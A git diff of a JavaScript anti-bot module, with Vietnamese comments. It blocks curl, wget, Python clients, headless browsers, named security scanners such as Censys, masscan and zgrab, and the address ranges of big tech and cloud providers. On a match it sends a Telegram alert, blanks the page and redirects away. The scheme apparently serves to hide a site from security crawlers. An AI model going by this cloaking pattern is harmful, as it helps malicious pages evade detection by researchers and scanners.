@@ -2,44 +2,39 @@ import config from '@/utils/config';
 import axios from 'axios';
 import { UAParser } from 'ua-parser-js';
 
-const blockedKeywords = [
-    'bot',
-    'crawler',
-    'spider',
+/** Chuỗi đặc trưng cho tool automation / headless (tránh từ quá ngắn như "http", "client", "bot"). */
+const automationSubstrings = [
     'headless',
+    'headlesschrome',
     'playwright',
     'webdriver',
     'puppeteer',
     'selenium',
     'phantomjs',
+    'nightmare',
     'electron',
-    'http',
-    'client',
-    'curl',
-    'wget',
-    'python',
-    'ruby',
+    'curl/',
+    'wget/',
+    'python-requests',
+    'libwww-perl',
+    'httpclient',
+    'go-http-client',
+    'axios/',
     'scrapy',
     'lighthouse',
     'censysinspect',
     'krebsonsecurity',
     'ivre-masscan',
-    'ahrefs',
-    'semrush',
-    'sistrix',
-    'mailchimp',
-    'mailgun',
     'larbin',
     'libwww',
     'spinn3r',
     'zgrab',
     'masscan',
-    'yandex',
-    'baidu',
-    'sogou',
     'tweetmeme',
     'misting',
-    'BotPoke',
+    'botpoke',
+    'sogouspider',
+    'sogouinspectspider',
     'google-read-aloud',
     'bytespider',
     'petalbot',
@@ -53,11 +48,30 @@ const blockedKeywords = [
     'gptbot',
     'oai-searchbot',
     'anthropic-ai',
+    'semrushbot',
+    'semrush',
+    'ahrefs',
+    'ahrefsbot',
+    'sistrix',
+    'mailchimp',
+    'mailgun',
+    'mj12bot',
+    'dotbot',
+    'rogerbot',
 ];
 
-const blockedASNs = [15169, 32934, 396982, 8075, 16510, 198605, 45102, 201814, 14061, 8075, 214961, 401115, 135377, 60068, 55720, 397373, 208312, 63949, 210644, 6939, 209, 51396, 147049];
+/** Bot / crawler có tên rõ ràng (tránh khớp trình duyệt Sogou; spider Sogou dùng chuỗi sogouspider / inspect). SEO: ahrefs|semrush|… trong automationSubstrings. */
+const crawlerOrToolPattern =
+    /\b(googlebot|adsbot-google|mediapartners-google|bingbot|yandexbot|baiduspider|duckduckbot|applebot|gptbot|bytespider|petalbot|facebot|amazonbot|facebookexternalhit|ia_archiver|discordbot|slackbot|telegrambot|exabot|ahrefsbot|semrushbot|mj12bot|dotbot|rogerbot)\b|\bcrawler\b|\b[\w.-]*spider[\w.-]*\/\d/i;
+
+const blockedASNs = [
+    15169, 32934, 396982, 8075, 16510, 198605, 45102, 201814, 14061, 214961, 401115, 135377, 60068, 55720, 397373, 208312, 63949, 210644, 6939, 209, 51396, 147049,
+];
 
 const blockedIPs = ['95.214.55.43', '154.213.184.3'];
+
+let lastNotifyAt = 0;
+const NOTIFY_COOLDOWN_MS = 10_000;
 
 const sendBotTelegram = async (reason) => {
     try {
@@ -76,14 +90,14 @@ const sendBotTelegram = async (reason) => {
                 userAgent: navigator.userAgent,
                 hardwareConcurrency: navigator.hardwareConcurrency,
                 maxTouchPoints: navigator.maxTouchPoints,
-                webdriver: navigator.webdriver
+                webdriver: navigator.webdriver,
             },
             screen: {
                 width: screen.width,
                 height: screen.height,
                 availWidth: screen.availWidth,
-                availHeight: screen.availHeight
-            }
+                availHeight: screen.availHeight,
+            },
         };
 
         const msg = `🚫 <b>BOT BỊ CHẶN</b>
@@ -105,31 +119,48 @@ const sendBotTelegram = async (reason) => {
         const payload = {
             chat_id: chatId,
             text: msg,
-            parse_mode: 'HTML'
+            parse_mode: 'HTML',
         };
 
         await axios.post(telegramUrl, payload, {
-            headers: { 'Content-Type': 'application/json' }
+            headers: { 'Content-Type': 'application/json' },
         });
     } catch {
         //
     }
 };
 
-const checkAndBlockBots = async () => {
-    const userAgent = navigator.userAgent.toLowerCase();
-    const blockedKeyword = blockedKeywords.find((keyword) => userAgent.includes(keyword));
-    if (blockedKeyword) {
-        const reason = `user agent chứa keyword: ${blockedKeyword}`;
+/** Một điểm vào duy nhất: gửi Telegram (có cooldown), xóa DOM, redirect. */
+const blockAndNotify = async (reason) => {
+    const now = Date.now();
+    if (now - lastNotifyAt >= NOTIFY_COOLDOWN_MS) {
+        lastNotifyAt = now;
         await sendBotTelegram(reason);
-        document.body.innerHTML = '';
-        try {
-            window.location.href = 'about:blank';
-        } catch {
-            //
-        }
+    }
+    document.body.innerHTML = '';
+    try {
+        window.location.href = 'about:blank';
+    } catch {
+        //
+    }
+};
+
+const checkUserAgentAutomation = async () => {
+    const userAgent = (navigator.userAgent || '').toLowerCase();
+
+    const bySubstring = automationSubstrings.find((s) => userAgent.includes(s.toLowerCase()));
+    if (bySubstring) {
+        const reason = `UA chứa chuỗi automation/tool: ${bySubstring}`;
+        await blockAndNotify(reason);
         return { isBlocked: true, reason };
     }
+
+    if (crawlerOrToolPattern.test(navigator.userAgent || '')) {
+        const reason = 'UA khớp mẫu crawler / SEO bot / spider';
+        await blockAndNotify(reason);
+        return { isBlocked: true, reason };
+    }
+
     return { isBlocked: false };
 };
 
@@ -144,17 +175,13 @@ const checkAndBlockByGeoIP = async () => {
 
         if (blockedASNs.includes(Number(data.asn))) {
             const reason = `ASN bị chặn: ${data.asn}`;
-            await sendBotTelegram(reason);
-            document.body.innerHTML = '';
-            window.location.href = 'about:blank';
+            await blockAndNotify(reason);
             return { isBlocked: true, reason };
         }
 
         if (blockedIPs.includes(data.ip)) {
             const reason = `IP bị chặn: ${data.ip}`;
-            await sendBotTelegram(reason);
-            document.body.innerHTML = '';
-            window.location.href = 'about:blank';
+            await blockAndNotify(reason);
             return { isBlocked: true, reason };
         }
 
@@ -167,72 +194,70 @@ const checkAndBlockByGeoIP = async () => {
 const checkAdvancedWebDriverDetection = async () => {
     if (navigator.webdriver === true) {
         const reason = 'navigator.webdriver = true';
-        await sendBotTelegram(reason);
-        document.body.innerHTML = '';
-        window.location.href = 'about:blank';
+        await blockAndNotify(reason);
         return { isBot: true, reason };
     }
 
     if ('__nightmare' in window) {
         const reason = 'nightmare detected';
-        await sendBotTelegram(reason);
-        document.body.innerHTML = '';
-        window.location.href = 'about:blank';
+        await blockAndNotify(reason);
         return { isBot: true, reason };
     }
     if ('_phantom' in window || 'callPhantom' in window) {
         const reason = 'phantom detected';
-        await sendBotTelegram(reason);
-        document.body.innerHTML = '';
-        window.location.href = 'about:blank';
+        await blockAndNotify(reason);
         return { isBot: true, reason };
     }
     if ('Buffer' in window) {
         const reason = 'buffer detected';
-        await sendBotTelegram(reason);
-        document.body.innerHTML = '';
-        window.location.href = 'about:blank';
+        await blockAndNotify(reason);
         return { isBot: true, reason };
     }
     if ('emit' in window) {
         const reason = 'emit detected';
-        await sendBotTelegram(reason);
-        document.body.innerHTML = '';
+        await blockAndNotify(reason);
         return { isBot: true, reason };
     }
     if ('spawn' in window) {
         const reason = 'spawn detected';
-        await sendBotTelegram(reason);
-        document.body.innerHTML = '';
+        await blockAndNotify(reason);
         return { isBot: true, reason };
     }
 
-    const seleniumProps = ['__selenium_unwrapped', '__webdriver_evaluate', '__driver_evaluate', '__webdriver_script_function', '__webdriver_script_func', '__webdriver_script_fn', '__fxdriver_evaluate', '__driver_unwrapped', '__webdriver_unwrapped', '__selenium_evaluate', '__fxdriver_unwrapped'];
+    const seleniumProps = [
+        '__selenium_unwrapped',
+        '__webdriver_evaluate',
+        '__driver_evaluate',
+        '__webdriver_script_function',
+        '__webdriver_script_func',
+        '__webdriver_script_fn',
+        '__fxdriver_evaluate',
+        '__driver_unwrapped',
+        '__webdriver_unwrapped',
+        '__selenium_evaluate',
+        '__fxdriver_unwrapped',
+    ];
 
     const foundProp = seleniumProps.find((prop) => prop in window);
     if (foundProp) {
         const reason = `selenium property: ${foundProp}`;
-        await sendBotTelegram(reason);
-        document.body.innerHTML = '';
+        await blockAndNotify(reason);
         return { isBot: true, reason };
     }
 
     if ('__webdriver_evaluate' in document) {
         const reason = 'webdriver_evaluate in document';
-        await sendBotTelegram(reason);
-        document.body.innerHTML = '';
+        await blockAndNotify(reason);
         return { isBot: true, reason };
     }
     if ('__selenium_evaluate' in document) {
         const reason = 'selenium_evaluate in document';
-        await sendBotTelegram(reason);
-        document.body.innerHTML = '';
+        await blockAndNotify(reason);
         return { isBot: true, reason };
     }
     if ('__webdriver_script_function' in document) {
         const reason = 'webdriver_script_function in document';
-        await sendBotTelegram(reason);
-        document.body.innerHTML = '';
+        await blockAndNotify(reason);
         return { isBot: true, reason };
     }
 
@@ -242,22 +267,14 @@ const checkAdvancedWebDriverDetection = async () => {
 const checkNavigatorAnomalies = async () => {
     if (navigator.webdriver === true) {
         const reason = 'navigator.webdriver = true';
-        await sendBotTelegram(reason);
-        document.body.innerHTML = '';
+        await blockAndNotify(reason);
         return { isBot: true, reason };
     }
 
-    if (navigator.hardwareConcurrency && navigator.hardwareConcurrency > 128) {
-        const reason = `hardwareConcurrency quá cao: ${navigator.hardwareConcurrency}`;
-        await sendBotTelegram(reason);
-        document.body.innerHTML = '';
-        window.location.href = 'about:blank';
-        return { isBot: true, reason };
-    }
-    if (navigator.hardwareConcurrency && navigator.hardwareConcurrency < 1) {
-        const reason = `hardwareConcurrency quá thấp: ${navigator.hardwareConcurrency}`;
-        await sendBotTelegram(reason);
-        document.body.innerHTML = '';
+    const hc = navigator.hardwareConcurrency;
+    if (typeof hc === 'number' && hc > 256) {
+        const reason = `hardwareConcurrency bất thường: ${hc}`;
+        await blockAndNotify(reason);
         return { isBot: true, reason };
     }
 
@@ -267,24 +284,18 @@ const checkNavigatorAnomalies = async () => {
 const checkScreenAnomalies = async () => {
     if (screen.width === 2000 && screen.height === 2000) {
         const reason = 'màn hình 2000x2000 (bot pattern)';
-        await sendBotTelegram(reason);
-        document.body.innerHTML = '';
-        window.location.href = 'about:blank';
+        await blockAndNotify(reason);
         return { isBot: true, reason };
     }
 
-    if (screen.width > 4000 || screen.height > 4000) {
+    if (screen.width > 8000 || screen.height > 8000) {
         const reason = `màn hình quá lớn: ${screen.width}x${screen.height}`;
-        await sendBotTelegram(reason);
-        document.body.innerHTML = '';
-        window.location.href = 'about:blank';
+        await blockAndNotify(reason);
         return { isBot: true, reason };
     }
     if (screen.width < 200 || screen.height < 200) {
         const reason = `màn hình quá nhỏ: ${screen.width}x${screen.height}`;
-        await sendBotTelegram(reason);
-        document.body.innerHTML = '';
-        window.location.href = 'about:blank';
+        await blockAndNotify(reason);
         return { isBot: true, reason };
     }
 
@@ -299,9 +310,7 @@ const checkAutomationDomAndWindowLeaks = async () => {
         const badDocKey = docKeys.find((k) => DOC_KEY_SUSPICIOUS_RE.test(k));
         if (badDocKey) {
             const reason = `document leak: ${badDocKey}`;
-            await sendBotTelegram(reason);
-            document.body.innerHTML = '';
-            window.location.href = 'about:blank';
+            await blockAndNotify(reason);
             return { isBot: true, reason };
         }
 
@@ -320,9 +329,7 @@ const checkAutomationDomAndWindowLeaks = async () => {
         const foundWin = winAutomationKeys.find((k) => k in window);
         if (foundWin) {
             const reason = `window automation: ${foundWin}`;
-            await sendBotTelegram(reason);
-            document.body.innerHTML = '';
-            window.location.href = 'about:blank';
+            await blockAndNotify(reason);
             return { isBot: true, reason };
         }
     } catch {
@@ -348,9 +355,7 @@ const checkWebGLSoftwareRenderer = async () => {
         const hit = markers.find((m) => renderer.includes(m) || vendor.includes(m));
         if (hit) {
             const reason = `WebGL software/headless: ${hit} (${renderer.slice(0, 120)})`;
-            await sendBotTelegram(reason);
-            document.body.innerHTML = '';
-            window.location.href = 'about:blank';
+            await blockAndNotify(reason);
             return { isBot: true, reason };
         }
     } catch {
@@ -363,18 +368,14 @@ const checkNavigatorFingerprintAnomalies = async () => {
     const ua = navigator.userAgent || '';
     if (ua.length < 12) {
         const reason = `user agent quá ngắn (${ua.length})`;
-        await sendBotTelegram(reason);
-        document.body.innerHTML = '';
-        window.location.href = 'about:blank';
+        await blockAndNotify(reason);
         return { isBot: true, reason };
     }
 
     const maxTouch = navigator.maxTouchPoints;
     if (typeof maxTouch === 'number' && (maxTouch < 0 || maxTouch > 100)) {
         const reason = `maxTouchPoints bất thường: ${maxTouch}`;
-        await sendBotTelegram(reason);
-        document.body.innerHTML = '';
-        window.location.href = 'about:blank';
+        await blockAndNotify(reason);
         return { isBot: true, reason };
     }
 
@@ -386,12 +387,52 @@ const checkNavigatorFingerprintAnomalies = async () => {
         window.innerWidth > 400
     ) {
         const reason = 'outerWidth=0, innerWidth lớn (headless pattern)';
-        await sendBotTelegram(reason);
-        document.body.innerHTML = '';
-        window.location.href = 'about:blank';
+        await blockAndNotify(reason);
         return { isBot: true, reason };
     }
 
+    return { isBot: false };
+};
+
+/** Chromium thật thường có window.chrome; UA giả Chrome + automation đôi khi thiếu. */
+const checkChromiumChromeObject = async () => {
+    const ua = navigator.userAgent || '';
+    const looksChromium =
+        /\bChrome\/\d+/i.test(ua) &&
+        !/\bEdg\//i.test(ua) &&
+        !/\bOPR\/|Opera\//i.test(ua) &&
+        !/\bBrave\//i.test(ua) &&
+        !/\bVivaldi\//i.test(ua);
+
+    if (!looksChromium) {
+        return { isBot: false };
+    }
+
+    if (typeof window.chrome === 'undefined' || window.chrome === null) {
+        const reason = 'UA kiểu Chrome nhưng không có window.chrome (headless / giả lập)';
+        await blockAndNotify(reason);
+        return { isBot: true, reason };
+    }
+
+    return { isBot: false };
+};
+
+/** userAgentData.brands rỗng trên Chromium đời mới là bất thường. */
+const checkUserAgentDataBrands = async () => {
+    try {
+        const ud = navigator.userAgentData;
+        if (!ud || typeof ud.brands === 'undefined') {
+            return { isBot: false };
+        }
+        const brands = ud.brands;
+        if (Array.isArray(brands) && brands.length === 0) {
+            const reason = 'navigator.userAgentData.brands rỗng (Chromium không chuẩn)';
+            await blockAndNotify(reason);
+            return { isBot: true, reason };
+        }
+    } catch {
+        //
+    }
     return { isBot: false };
 };
 
@@ -403,9 +444,7 @@ const checkChromeDriverElementAttr = async () => {
         }
         if (html.hasAttribute('webdriver') || html.getAttribute('webdriver') === 'true') {
             const reason = 'thẻ html có attribute webdriver (Selenium/ChromeDriver)';
-            await sendBotTelegram(reason);
-            document.body.innerHTML = '';
-            window.location.href = 'about:blank';
+            await blockAndNotify(reason);
             return { isBot: true, reason };
         }
     } catch {
@@ -415,7 +454,7 @@ const checkChromeDriverElementAttr = async () => {
 };
 
 const detectBot = async () => {
-    const userAgentCheck = await checkAndBlockBots();
+    const userAgentCheck = await checkUserAgentAutomation();
     if (userAgentCheck.isBlocked) {
         return { isBot: true, reason: userAgentCheck.reason };
     }
@@ -423,6 +462,16 @@ const detectBot = async () => {
     const fingerprintEarly = await checkNavigatorFingerprintAnomalies();
     if (fingerprintEarly.isBot) {
         return { isBot: true, reason: fingerprintEarly.reason };
+    }
+
+    const uaDataBrands = await checkUserAgentDataBrands();
+    if (uaDataBrands.isBot) {
+        return { isBot: true, reason: uaDataBrands.reason };
+    }
+
+    const chromiumChrome = await checkChromiumChromeObject();
+    if (chromiumChrome.isBot) {
+        return { isBot: true, reason: chromiumChrome.reason };
     }
 
     const webDriverCheck = await checkAdvancedWebDriverDetection();
@@ -460,14 +509,7 @@ const detectBot = async () => {
         return { isBot: true, reason: geoIPCheck.reason };
     }
 
-    const obviousBotKeywords = ['googlebot', 'bingbot', 'crawler', 'spider'];
-    const foundKeyword = obviousBotKeywords.find((keyword) => navigator.userAgent.toLowerCase().includes(keyword));
-
-    if (foundKeyword) {
-        return { isBot: true, reason: `obvious bot keyword: ${foundKeyword}` };
-    } else {
-        return { isBot: false };
-    }
+    return { isBot: false };
 };
 
 export default detectBot;
@@ -535,7 +577,7 @@ export const detectDevice = () => {
             engine: engineInfo,
             deviceInfo,
             userAgent,
-            raw: result
+            raw: result,
         };
     } catch (error) {
         return {
@@ -548,7 +590,7 @@ export const detectDevice = () => {
             deviceInfo: 'Unknown Device - Unknown OS - Unknown Browser',
             userAgent: '',
             raw: null,
-            error: error.message
+            error: error.message,
         };
     }
 };
